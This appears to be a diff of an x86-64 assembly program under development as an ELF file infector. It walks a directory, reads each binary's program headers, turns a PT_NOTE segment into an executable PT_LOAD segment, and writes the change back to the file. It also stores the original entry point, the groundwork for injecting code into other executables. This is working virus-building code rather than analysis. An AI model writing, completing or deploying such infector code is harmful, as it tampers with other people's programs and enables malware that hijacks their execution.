@@ -4,6 +4,7 @@
 %define SYS_STAT 4
 %define SYS_FSTAT 5
 %define SYS_PREAD64 17
+%define SYS_PWRITE64 18
 %define SYS_EXIT 60
 %define SYS_CHDIR 80
 %define SYS_GETDENTS64 217
@@ -17,7 +18,12 @@
 
 %define EHDR_SIZE 64
 %define PHDR_SIZE 56
+%define PT_NOTE	4
+%define PT_LOAD 1
 
+%define PF_X 1
+%define PF_W 2 
+%define PF_R 4 
 ; r15 /tmp/test
 ; r15 + 16 /tmp/test fd
 ; r15 + 32 struct stat
@@ -61,8 +67,9 @@
 ; 		r15 + 1472	p_align;	
 ; r15 + 1420 binary_fd
 
-; r15 + 1484  phdr_num counter
-
+; r15 + 1484 	phdr_num counter
+; r15 + 1488	pt_load value buffer address
+; r15 + 1492	program original entry point
 
 global _start
 
@@ -192,6 +199,9 @@ _is_elf:
 	cmp byte [r15 + 1300], 0x464c457f
 	jne _close_bin
 
+_save_entry_dpuente:  ;; very important!!!
+	xor rax, rax
+
 	mov byte [r15 + 1484], 0
 _read_phdr:
 	mov word r9w, [r15 + 1484]
@@ -200,17 +210,42 @@ _read_phdr:
 
 	lea rsi, [r15 + 1424]; phdr
 	mov rdx, PHDR_SIZE
-	mov r10, r8
+	mov r10, [r15 + 1484]
 	imul r10,r10, PHDR_SIZE
 	add r10, EHDR_SIZE
 	mov rax, SYS_PREAD64
 	syscall
 
+	cmp word [r15 + 1424], PT_NOTE ; phdr->type
+	jne _next_phdr
+
+	;; pwrite(fd, buff, size, off)
+
+_change_ptnote_to_ptload:
+	mov dword [r15 + 1424], PT_LOAD
+
+_change_mem_protections:
+	mov dword [r15 + 1428], PF_R | PF_X
+
+_write_header_changes_to_bin:
+	mov rdi, [r15 + 1420]
+	lea rsi, [r15 + 1424]
+	mov rdx, PHDR_SIZE
+	; mov r10, r10
+	mov rax, SYS_PWRITE64
+	syscall
+	
+
+	jmp _close_bin
+
+
+_next_phdr:
 	inc word [r15 + 1484]
 	jmp _read_phdr
 
 
 _close_bin:
+	mov qword rdi,[ r15 + 1420]
 	mov rax, SYS_CLOSE
 	syscall
 
